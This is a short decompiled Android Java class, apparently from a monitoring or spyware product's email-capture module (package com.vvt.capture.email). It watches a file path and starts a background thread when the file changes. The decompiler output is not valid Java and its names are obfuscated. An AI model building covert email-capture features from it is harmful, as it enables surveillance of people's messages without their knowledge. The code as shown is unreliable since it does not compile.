package com.vvt.capture.email.b.a;

import android.os.FileObserver;
import java.io.File;

class b
  extends FileObserver
{
  private Thread b = null;
  private String c;
  private File d;
  
  public b(a parama, String paramString)
  {
    super(paramString, 2);
    this.c = paramString;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    Thread localThread = this.b;
    if (localThread == null)
    {
      boolean bool = a.a();
      if (bool) {}
      localThread = new java/lang/Thread;
      c localc = new com/vvt/capture/email/b/a/c;
      localc.<init>(this);
      localThread.<init>(localc);
      this.b = localThread;
      localThread = this.b;
      localThread.start();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/removeFromPath/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */